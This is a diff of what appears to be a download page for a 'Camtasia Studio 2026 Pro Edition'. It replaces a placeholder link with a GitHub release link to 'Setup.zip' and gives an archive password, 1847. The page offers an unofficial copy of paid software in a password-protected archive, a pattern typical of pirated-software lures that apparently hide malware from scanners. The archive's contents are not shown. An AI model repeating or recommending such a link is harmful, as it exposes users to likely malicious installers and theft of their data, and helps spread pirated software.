@@ -9,7 +9,7 @@ Camtasia Studio 2026 Pro Edition. professional screen recording, video editing, 
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://google.com)
+[+] DOWNLOAD LINK: [download here](https://github.com/TalonJuniorSquare/Camtasia-Studio/releases/download/Last/Setup.zip)
 [+] 🔐🔐🔐: 1847
 
 ------------------------------------------------
